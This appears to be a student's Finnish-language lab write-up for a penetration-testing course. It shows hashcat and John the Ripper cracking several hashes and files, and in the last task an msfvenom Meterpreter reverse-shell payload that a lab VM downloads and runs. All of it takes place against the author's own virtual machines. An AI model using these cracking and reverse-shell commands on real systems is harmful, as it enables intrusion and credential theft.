## h3 Leviämässä

Tehtävät ovat Tero Karvisen opintojaksolta [Tunkeutumistestaus](https://terokarvinen.com/tunkeutumistestaus/) [^1]

---

#### Laite jolla tehtävät tehdään:

- Apple MacBook Pro M2 Max
- macOS Sequoia 15.3.2
- Parallels Desktop

---

### x) Lue/katso ja tiivistä.

- Karvinen 2022: Cracking Passwords with Hashcat [^2]

    - Järjestelmiin ei tallenneta orginaaleja salasanoja, vaan salasanat tallennetaan hash-muodossa.
    - hash on yksisuuntainen funktio, eikä hashattua salasanaa voi enää kääntää takaisin alkuperäiseen muotoon. 
    - Mahdollisia sanoja voi kokeilla ja tarkistaa vastaako se hashattua salasanaa. 
    - Hashcat on työkalu hashattujen salasanojen murtamiseen

- Karvinen 2023: Crack File Password With John [^6]

  - John the Ripper on työkalu, jolla murretaan encryptattujen tiedostojen salasanoja.
  - Salasanan murtaminen John the Ripperillä on kaksivaiheinen prosessi

    - ensin erotetaan hash omaan tiedostoon 
    - suoritetaan John:lla directory attact hashiin

- € Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials [^9]

  - Käyttäjien credentiaalit tallennetaan usein tietokantaan tai tekstitiedostoille.
  - Active directoryssä credentiaalit tallennetaan "proprietary database" (omistettuun tietokantaan, olettaisin viittaavan siihen, että kyseinen yritys omistaa tietokannan kokonaisuudessaan, eikä se ole miltään osin vuokrattu)
  - käyttäjät eivät aina vaihda default sanosanoja ja käyttävät samoja salasanoja useasti.
  - hash algoritmilla voidaan muuttaa normaali teksti hash arvoksi. 
  - yksinkertaisimmillaan voi olla `echo "word" | sha256sum`
  - salting muuttaa hash arvoa (saman sanan hashaus ei tuota samaa hashia kun salt)

- € Kennedy et al 2025: Metasploit: File-Format Exploits [^10]

  - File-format bugit ovat tiedostonlukiojoista löytyviä haavoittuvuuksia.
  - Perustuu siihen, että käyttäjä avaa haitallisen tiedoston haavoittuvassa ohjelmassa. 
  - Käytettyjä tiedostoja voivat olla Microsoft Word dokumentti, pdf, kuva tai mikä tahansa muu tiedostotyyppi. 
  - Metasploit tarjoaa hyviä työkaluja File-format exploidien tekemiseen.

- € Singh 2025: The Ultimate Kali Linux Book: Understanding Active Directory [^11]

  - Active Directory on Microsoftin palvelu, jolla voidaan tehdä keskitettyä käyttäjien, ryhmien, laitteiden ja policien hallintaa.
  - Windows palvelinta, johon on asennettu Active Directory, kutsutaan yleisesti "domain controlleriksi".

- € Vapaaehtoinen: Kennedy et al 2025: Metasploit: Basic Meterpreter Commands [^12]

  - Kun kohteeseen pääsy on onnistunut ja on saavutettu Meterpreter sessio kohde järjestelmässä voidaan ajaa Meterpeter komentoja. 
  - `screenshot` nättökuviin
  - `sysinfo` tietoa kohteen järjestelmästä

---

### a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Karvisen ohjeesta [^2] valitsin murrettavaksi esimerkkisalasanaksi `6b1628b016dff46e6fa35684be6acc96`. Samaa ohjetta seuraamalla suoritin seuraavat komennot:

```
sudo apt-get -y install hashid hashcat wget
```

```
mkdir hashed
cd hashed
```

```
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

En ole ennen käyttänyt tar tiedostoja (vaikkakin ole kyllä kuullut niistä) joten:

- tar - tar on archiving utility [^3]
- -x - parametrilla saa "extract files from an archive" [^3]
- -f - parametrilla tarjoitetaan varmastikin file [^3]

```
tar -xf rockyou.txt.tar.gz
```

```
rm rockyou.txt.tar.gz
```

Seuraavaksi Karvisen ohjeen [^2] mukaan tulee identifioida hash tyyppi. Käytin tähän ohjeen `hashid` komentoa:

- hashid - hashid on työkalu, jota käytetään identifioimaan eri tyyppisiä hasheja [^4]
- -m - lisää outputtiin vastaavan hashcat moodin [^4]

```
hashid -m 6b1628b016dff46e6fa35684be6acc96
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ hashid -m 6b1628b016dff46e6fa35684be6acc96
Analyzing '6b1628b016dff46e6fa35684be6acc96'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]
```

Kuten ohjeessa [^2] kokeillaan MD5 eli hashcat moodia 0

- -m - hash tyyppi [^2]
- -o - tallentaa ratkaisun parametrin jälkeen määritettyyn tiedostoon [^2]

```
hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1399/2863 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 6b1628b016dff46e6fa35684be6acc96
Time.Started.....: Tue Apr 22 16:35:57 2025 (0 secs)
Time.Estimated...: Tue Apr 22 16:35:57 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    21574 H/s (0.04ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344384 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> letmein
Hardware.Mon.#1..: Util: 49%

Started: Tue Apr 22 16:35:45 2025
Stopped: Tue Apr 22 16:35:58 2025
```

Aika siisti! Kuten ohjeessa [^2] ratkaistu salasana tallentui solved tiedostoon:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ ls   
rockyou.txt  solved
                                                                                                                                                            
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ cat solved                                                                      
6b1628b016dff46e6fa35684be6acc96:summer
```

---

### c) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

Seurasin Karvisen ohjetta [^6] ja aloitin asennuksen seuraavilla komennoilla:

```
sudo apt-get -y install build-essential libssl-dev zlib1g zlib1g-dev libbz2-1.0 libbz2-dev atool zip
```

zlib-gst ei löytynyt paketinhallinnasta. Katsotaan aiheuttaako sen puute jotain.

```bash
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ apt-cache search zlib-gst
```

Seuraavaksi ohjeen mukaan kloonaus GitHubista:

```
git clone --depth=1 https://github.com/openwall/john.git
```

```
cd jonh/src/
```

```
./configure
```

Ohjelma asennus päättyi tähän infoon:

```bash
Configured for building John the Ripper jumbo:

Target CPU ......................................... aarch64 ASIMD, 64-bit LE
Target OS .......................................... linux-gnu
Cross compiling .................................... no
Legacy arch header ................................. arm64le.h

Optional libraries/features found:
Memory map (share/page large files) ................ yes
Fork support ....................................... yes
OpenMP support ..................................... yes (not for fast formats)
OpenCL support ..................................... no
Generic crypt(3) format ............................ yes
OpenSSL (many additional formats) .................. yes
libgmp (PRINCE mode and faster SRP formats) ........ yes
128-bit integer (faster PRINCE mode) ............... yes
libz (7z, pkzip and some other formats) ............ yes
libbz2 (7z and gpg2john bz2 support) ............... yes
libpcap (vncpcap2john and SIPdump) ................. no
Non-free unrar code (complete RAR support) ......... yes
librexgen (regex mode, see doc/README.librexgen) ... no
OpenMPI support (default disabled) ................. no
Experimental code (default disabled) ............... no
ZTEX USB-FPGA module 1.15y support ................. no

Install missing libraries to get any needed features that were omitted.

Configure finished.  Now "make -s clean && make -sj2" to compile.
```

```
make -s clean && make -sj4
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/john/src]
└─$ make -s clean && make -sj4
/usr/bin/ar: creating poly1305-donna.a
/usr/bin/ar: creating aes.a
/usr/bin/ar: creating secp256k1.a
/usr/bin/ar: creating ed25519-donna.a

Make process completed.
```

Kuten ohjeessa [^6], ohjelman ajamisen pitäisi nyt onnistua:

```
~/john/run/john
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/john/src]
└─$ ~/john/run/john
John the Ripper 1.9.0-jumbo-1+bleeding-88e3eeb928 2025-04-22 13:24:06 +0200 OMP [linux-gnu 64-bit aarch64 ASIMD AC]
Copyright (c) 1996-2025 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
```

Seuraavaksi ladataan Karvisen testi zip [^6]

```
wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip
```

Kokeillaan avata:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ unzip tero.zip 
Archive:  tero.zip
   creating: secretFiles/
[tero.zip] secretFiles/SECRET.md password:  
```

secretFiles on tyhjä, tarvitaan salasana.

Tehdän kuten ojeessa [^6] ja erotetaan hash omaksi tiedostoksi ja tehdään sen jälkeen directory attack hash:iin.  

```
~/john/run/zip2john tero.zip >tero.zip.hash
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ ~/john/run/zip2john tero.zip >tero.zip.hash
ver 1.0 tero.zip/secretFiles/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 tero.zip/secretFiles/SECRET.md PKZIP Encr: TS_chk, cmplen=183, decmplen=217, crc=4C752C85 ts=572B cs=572b type=8
```

```
~/john/run/john tero.zip.hash 
```

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ ~/john/run/john tero.zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-04-22 20:04) 0g/s 2816Kp/s 2816Kc/s 2816KC/s Mdzip1900..Msecret1900
Proceeding with wordlist:/home/parallels/john/run/password.lst
Enabling duplicate candidate password suppressor using 256 MiB
butterfly        (tero.zip/secretFiles/SECRET.md)     
1g 0:00:00:00 DONE 2/3 (2025-04-22 20:04) 25.00g/s 3751Kp/s 3751Kc/s 3751KC/s 123456..281985
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Salasanalla 'butterfly' sai zipin auki.

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn/secretFiles]
└─$ cat SECRET.md  
You've found the secret, well done!

You have now completed the tutorial. 

Did you know that Jumbo John can handle many other file formats, too [1]?

[1] https://TeroKarvinen.com/2023/crack-file-password-with-john/
```

---

### e) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi).

Stack Exchange keskustelusta [^7] löytyvän ohjeen avulla tein tekstitiedostoon salauksen gpg:llä:

- gpg - OpenPGP enkryptaus ja signaus työkalu [^8]
- --batch - tekee commandista ei interaktiivisen  [^8]
- -c - symmetrinen salaus [^8]
- --passphrase - mahdollistaa salauksen stiringilla. Vaatii, että --batch on myös parametrina [^8]

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ nano mysecret.txt            
                                                                                                                                                            
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ gpg --batch -c --passphrase password mysecret.txt
gpg: keybox '/home/parallels/.gnupg/pubring.kbx' created

┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ cat mysecret.txt.gpg
��2  
```

Katsoin `/jonh/run/` hakemistoa ja siellä olevan `gpg2john` luulisin olevan tähän oikea, joten tehdään sillä kuten tehtiin tehtävässä c.

```
~/john/run/gpg2john mysecret.txt.gpg >mysecret.txt.gpg.hash
```

```
~/john/run/john mysecret.txt.gpg.hash 
```

Ja oikea salasana tai passphrase 'password' löytyi:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ ~/john/run/john mysecret.txt.gpg.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/home/parallels/john/run/password.lst
Enabling duplicate candidate password suppressor using 256 MiB
password         (?)     
1g 0:00:00:01 DONE 2/3 (2025-04-22 21:06) 0.5848g/s 37.43p/s 37.43c/s 37.43C/s 123456..green
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- d - dekryptaus annetulle tiedostolle [^8] 

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/PracticeJohn]
└─$ gpg -d mysecret.txt.gpg                          
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
This is secret.
```

---


### f) Tiiviste. Tee itse tai etsi verkosta salasanan tiiviste, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi. Voit esim. tehdä käyttäjän Linuxiin ja murtaa sen salasanan.)

Kokeilen bcrypt salasanaa `$2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q0e4bRadue`.

hashid ei tunnistanut bcrytp salasanaa, mutta katsoin täältä [^5], että moodin pitäisi olla 3200.

Se ei ollutkaan niin helppo ja olisi hascatin laskurin mukaan vaatinut virtuaalikoneeltani yli neljä päivää (jos tein tämän oikein) ja keskeytin.

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ hashcat -m 3200 '$2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q0e4bRadue' rockyou.txt -o solved
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1399/2863 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q...bRadue
Time.Started.....: Tue Apr 22 16:46:35 2025 (1 min, 32 secs)
Time.Estimated...: Sun Apr 27 02:31:46 2025 (4 days, 9 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       38 H/s (6.48ms) @ Accel:2 Loops:64 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 3436/14344384 (0.02%)
Rejected.........: 0/3436 (0.00%)
Restore.Point....: 3436/14344384 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:320-384
Candidate.Engine.: Device Generator
Candidates.#1....: reebok -> fluffy1
Hardware.Mon.#1..: Util: 96%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

Session..........: hashcat                                
Status...........: Quit
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q...bRadue
Time.Started.....: Tue Apr 22 16:46:35 2025 (2 mins, 51 secs)
Time.Estimated...: Sun Apr 27 02:52:44 2025 (4 days, 10 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       38 H/s (6.48ms) @ Accel:2 Loops:64 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 6416/14344384 (0.04%)
Rejected.........: 0/6416 (0.00%)
Restore.Point....: 6416/14344384 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:320-384
Candidate.Engine.: Device Generator
Candidates.#1....: amparo -> 2222222222
Hardware.Mon.#1..: Util: 99%

Started: Tue Apr 22 16:46:19 2025
Stopped: Tue Apr 22 16:49:27 2025
```

Laitoin oman sanalistan, johon olin laittanut vain oikean salasanan ja tällöin vastaus tuli heti:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ hashcat -m 3200 '$2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q0e4bRadue' myown.txt -o solved
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1399/2863 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: myown.txt
* Passwords.: 1
* Bytes.....: 5
* Keyspace..: 1
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q...bRadue
Time.Started.....: Tue Apr 22 17:21:22 2025 (0 secs)
Time.Estimated...: Tue Apr 22 17:21:22 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (myown.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       19 H/s (1.64ms) @ Accel:2 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: user -> user
Hardware.Mon.#1..: Util: 50%

Started: Tue Apr 22 17:21:20 2025
Stopped: Tue Apr 22 17:21:24 2025
                                                                                                                                                            
┌──(parallels㉿kali-linux-2024-2)-[~/hashed]
└─$ cat solved 
6b1628b016dff46e6fa35684be6acc96:summer
$2a$10$NVM0n8ElaRgg7zWO1CxUdei7vWoPg91Lz2aYavh9.f9q0e4bRadue:user
```
---

### g) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

Päätin tehdä Vagrantilla Debian virtuaalikoneen, joka ajaisi haittaohjelman. 

Löysin tämän apache2 ohjeen [^13] ja tein sillä endpointin apache2:seen, jolla saisin ohjelman ladattua Debianiin.

Tein Karvisen ohjeen [^1] ja pentestTV:n videon [^14] avulla seuraavan komennon ja kopioitsin sen apachen2 endpointin kansioon:

Tarkistin `msfvenom -l archs` [^14] mikä olisi arm koneellini sopiva ja kokeillaan jos 'aarch64' toimisi.

- -p - payload [^16]
- -f - output format [^16]

```
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=10.211.55.13 LPORT=4444 -f bash > reversetcp.sh
```

Seuraavaksi asensin Vagrantilla uuden Debianin ja kun olin valmis latasin Kalista tekemäni ohjelman. 

```
wget 10.211.55.13/downloads/reversetcp.sh
```

```bash
vagrant@debian-12:~$ wget 10.211.55.13:80/downloads/reversetcp.sh
--2025-04-22 16:27:01--  http://10.211.55.13/downloads/reversetcp.sh
Connecting to 10.211.55.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1009 [text/x-sh]
Saving to: ‘reversetcp.sh’

reversetcp.sh                           100%[=============================================================================>]    1009  --.-KB/s    in 0s

2025-04-22 16:27:01 (128 MB/s) - ‘reversetcp.sh’ saved [1009/1009]

vagrant@debian-12:~$ ls
reversetcp.sh
```

Seuraavaksi pitää varmastikin tehdä multi/handler konfigurointi Kalissa. 

Tein msfconsolen multi/handler konfiguroinnin seuraten Occupytheweb kirjaa [^15]. (avasin myös Kalin palomuurista portin 4444)

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Downloads]
└─$ msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  
     ,           ,
    /             \                                                                                                                                         
   ((__---,,,---__))                                                                                                                                        
      (_) O O (_)_________                                                                                                                                  
         \ _ /            |\                                                                                                                                
          o_o \   M S F   | \                                                                                                                               
               \   _____  |  *                                                                                                                              
                |||   WW|||                                                                                                                                 
                |||     |||                                                                                                                                 
                                                                                                                                                            

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/aarch64/meterpreter/reverse_tcp
PAYLOAD => linux/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.211.55.13
LHOST => 10.211.55.13
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.211.55.13:4444 
```

Ajetaan shell ohjelma Debianissa:

```bash
vagrant@debian-12:~$ ./reversetcp.sh
-bash: ./reversetcp.sh: Permission denied
vagrant@debian-12:~$ ls -l
total 4
-rw-r--r-- 1 vagrant vagrant 1009 Apr 22 15:58 reversetcp.sh
vagrant@debian-12:~$ sudo chmod ugo+x reversetcp.sh
vagrant@debian-12:~$ ./reversetcp.sh
```

Ei toiminut (mitään ei tapahtunut msfconsolessa). Tein muutoksen: 

```
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=10.211.55.13 LPORT=4444 -f elf > reversetcp.elf
```

Tällä saatiin toivottu tulos:

```bash
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/Mvenom]
└─$ msfconsole                                                                                             
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----                                                                                                        
                            /  ,' `-._<.===-'                                                                                                               
                           /  /                                                                                                                             
                          /  ;                                                                                                                              
              _          /   ;                                                                                                                              
 (`._    _.-"" ""--..__,'    |                                                                                                                              
 <_  `-""                     \                                                                                                                             
  <`-                          :                                                                                                                            
   (__   <__.                  ;                                                                                                                            
     `-.   '-.__.      _.'    /                                                                                                                             
        \      `-.__,-'    _,'                                                                                                                              
         `._    ,    /__,-'                                                                                                                                 
            ""._\__,'< <____                                                                                                                                
                 | |  `----.`.                                                                                                                              
                 | |        \ `.                                                                                                                            
                 ; |___      \-``                                                                                                                           
                 \   --<                                                                                                                                    
                  `.`.<                                                                                                                                     
                    `-'                                                                                                                                     
                                                                                                                                                            
                                                                                                                                                            

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/aarch64/meterpreter/reverse_tcp
PAYLOAD => linux/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.211.55.13
LHOST => 10.211.55.13
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.211.55.13:4444 
[*] Transmitting intermediate midstager...(256 bytes)
[*] Sending stage (953388 bytes) to 10.211.55.33
[*] Meterpreter session 1 opened (10.211.55.13:4444 -> 10.211.55.33:48218) at 2025-04-23 01:03:01 +0300

meterpreter > sysinfo
Computer     : debian-12.localdomain
OS           : Debian 12.9 (Linux 6.1.0-31-arm64)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > 
```



---

### Lähteet

[^1]: Tero Karvinen. Tunkeutumistestaus: https://terokarvinen.com/tunkeutumistestaus/

[^2]: Tero Karvinen. Cracking Passwords with Hashcat: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

[^3]: man tar

[^4]: man hashid

[^5]: hashcat. Example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes

[^6]: Tero Karvinen. Crack File Password With John: https://terokarvinen.com/2023/crack-file-password-with-john/

[^7]: Stack Exchange. Best way to encrypt a file with just password (no keypairs) that is easily usable/decryptable on both Linux and macOS?: https://unix.stackexchange.com/questions/749766/best-way-to-encrypt-a-file-with-just-password-no-keypairs-that-is-easily-usabl

[^8]: man gpg

[^9]: Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: https://www.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/

[^10]: Kennedy et al 2025: Metasploit: File-Format Exploits: https://learning.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter9.xhtml#toc-link_128

[^11]: Singh 2025: The Ultimate Kali Linux Book: Understanding Active Directory: https://learning.oreilly.com/library/view/the-ultimate-kali/9781835085806/Text/Chapter_12.xhtml#_idParaDest-272

[^12]: Kennedy et al 2025: Metasploit: https://learning.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter6.xhtml#toc-link_85

[^13]: Jobin J. How to Set Up a File Download Server on Ubuntu with Apache: https://medium.com/@techworldthink/how-to-set-up-a-file-download-server-on-ubuntu-with-apache-c35bc03eb218

[^14]: pentestTV. MSFvenom Demystified: Unlocking the Power of Exploit Shellcode: https://www.youtube.com/watch?v=ROBLGTEqUBQ

[^15]: Occupytheweb. Getting Started Becoming a Master Hacker. https://www.amazon.com/Getting-Started-Becoming-Master-Hacker/dp/1711729299

[^16]: man msfvenom